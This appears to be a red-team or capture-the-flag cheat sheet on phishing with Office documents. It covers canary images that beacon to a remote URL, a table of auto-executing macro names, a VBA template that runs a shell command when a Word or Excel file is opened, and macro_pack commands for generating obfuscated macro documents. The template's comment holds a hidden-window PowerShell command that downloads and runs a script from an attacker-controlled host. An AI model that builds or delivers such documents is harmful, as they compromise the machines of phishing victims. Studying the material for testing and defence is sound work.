# Phishing - Office Documents

### Word canary image

A canary image is an image in a Word document that will, whenever the document
is opened in Microsoft `Word` or `libreoffice`, trigger a request to a remote
URL.

In a Capture The Flag scenario requiring phishing, a canary image can be used
to determine if the target is making use of Microsoft Word in order to pursue
Word related attacks (such as office documents with macros, etc.).

The process to create a canary image in a Word `.docx` document is as follow:
  - Insert tab -> Quick Part -> Field
  - Categories: "Links and References"
  - IncludePicture -> "File name or URL": `http://<IP>/canary.gif`

### Office documents with macro

###### Automatic macros ("auto macros")

*General concept.*

A number of macro names are associated with automatic execution upon
realization of specific operations. The following macro names are associated
by `MS Office` applications to automatic execution:

| Application | Macro name | Triggering operation |
|-------------|------------|----------------------|
| `Word` | `AutoOpen` |	Opening of an existing document. |
| `Word` | `AutoExec` |	Upon start of `MS Word` or loading of a global template. |
| `Word` | `AutoNew` |	Creation of a new document. |
| `Word` | `AutoClose` |	Closing of a document. |
| `Word` | `AutoExit` |	Upon exit of `MS Word` or unloading a global template. |
| `Excel` | `Workbook_Open` | Opening of the workbook. |
| `Excel` | `Workbook_WindowResize(ByVal Wn As Excel.Window)` | Resizing of the window of a workbook. |
| `Excel` | `Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)` | Before save of the workbook. |
| `Excel` | `Workbook_AfterSave(ByVal Success As Boolean)` | After save of the workbook. |
| `Excel` | `Workbook_BeforeClose(Cancel As Boolean)` | Before closing of the workbook. |
| `Excel` | `Workbook_BeforePrint(Cancel As Boolean)` | Before printing of the workbook. |
| `Excel` | `Workbook_NewSheet(ByVal Sh As Object)` | Creation of a new sheet. |
| `Excel` | `Workbook_SheetActivate(ByVal Sh As Object)` | Switching to a different sheet. |
| `Excel` | `Workbook_SheetSelectionChange(ByVal Sh As Object, ByVal Target As Range)` | Modification of a cell content. |
| `Excel` | `Workbook_SheetBeforeDoubleClick(ByVal Sh As Object, ByVal Target As Range, Cancel As Boolean)` | Before a double-click on a cell. |
| `Excel` | `Workbook_SheetBeforeRightClick(ByVal Sh As Object, ByVal Target As Range, Cancel As Boolean)` | Before a right-click on a cell. |

A more comprehension list of the `auto macros` supported by `Excel` can be
found in the official [Microsoft
documentation](https://docs.microsoft.com/fr-fr/office/vba/api/excel.workbook).

*Automatic macro example.*

The following `VBA` code execute the `Test` macro upon opening in `MS Word`
(with `AutoOpen`) and `MS Excel` (with `Workbook_Open`):

```
'<OS_COMMAND> basic example to download and execute in memory a PowerShell script from a webserver: cmd /c powershell.exe -NoP -NoExit -W Hidden -Exec Bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://<IP>/<PS_SCRIPT>').

Sub Test()
   Dim code: code = "<OS_COMMAND>"
   Shell (code)
End Sub

Sub AutoOpen()
   Test
End Sub

Sub Workbook_Open()
   Test
End Sub
```

###### Automated Office documents generation with macro_pack

[`macro_pack`](https://github.com/sevagas/macro_pack) is a Python script that
automatically obfuscate `VBA` macros and generate documents embedding macros. A
"community version" is open sourced and a "pro version", that includes
additional features, can be purchased.  

The following output formats are supported by `macro_pack` (listed using
`macro_pack.exe --listformats`):
  - Office documents:
    - Excel: `.xlsm`
    - Excel97: `.xls`
    - Word: `.docm`
    - Word97: `.doc`
    - PowerPoint: `.pptm`
    - MSProject: `.mpp`
    - Visio: `.vsdm`
    - Visio97: `.vsd`
    - Access: `.mdb`

  - `VB` formats:
    - Visual Basic Script: `.vbs`
    - HTML Application: `.hta`
    - Windows Script Component: `.sct`
    - Windows Script File: `.wsf`
    - XSLT Stylesheet: `.xsl`

  - Shortcuts / others formats:
    - Shell Link: `.lnk`
    - Groove Shortcut: `.glk`
    - Explorer Command File: `.scf`
    - URL Shortcut: `.url`
    - Settings Shortcut: `.SettingContent-ms`
    - MS Library: `.library-ms`
    - Setup Information: `.inf`
    - Excel Web Query: `.iqy`
    - (Pro version only) SYmbolic LinK: `.slk`
    - (Pro version only) Compressed HTML Help: `.chm`
    - Command line: `.cmd`
    - Visual Studio Project: `.csproj`

Note that `MS Office` applications must be installed for the corresponding
documents generation (`MS Word`, `MS Excel`, etc.).

```
# Generates a document incorporating the obfuscated VBA macro specified.
# The output document format will be automatically deducted by macro_pack from the given file extension.
macro_pack.exe -f "<VBA_TXT_FILE>" -o -G "<OUTPUT_FILE>"

# Opens the specified document, triggering AutoOpen / Workbook_Openuse macros. Useful for testing purposes.
macro_pack.exe --run "<FILE>"
```

--------------------------------------------------------------------------------

### References

https://github.com/sevagas/macro_pack
https://docs.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros
https://docs.microsoft.com/fr-fr/office/vba/api/excel.workbook
https://www.excel-pratique.com/fr/vba/evenements_classeur
https://github.com/christophetd/spoofing-office-macro
https://www.youtube.com/watch?v=l8nkXCOYQC4
https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/
